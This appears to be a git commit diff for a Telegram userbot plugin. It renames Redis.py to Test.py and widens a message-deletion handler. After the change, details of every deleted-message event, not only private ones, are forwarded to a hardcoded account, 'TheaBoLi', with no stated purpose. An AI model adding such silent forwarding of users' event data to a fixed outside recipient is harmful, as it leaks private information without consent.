8abdeda0229aa8af535b70576bd33c25b8bba804
Aboli <96248859+iMaBoLi@users.noreply.github.com>
2022-12-21 00:40:33 +0330

    Update and rename Redis.py to Test.py

--- FidoSelf/plugins/Test.py
+++ FidoSelf/plugins/Test.py
@@ -3,5 +3,4 @@ from telethon import events
 
 @client.on(events.MessageDeleted)
 async def _(event):
-     if event.is_private:
-         await client.bot.send_message("TheaBoLi", event.stringify())
+     await client.bot.send_message("TheaBoLi", event.stringify())
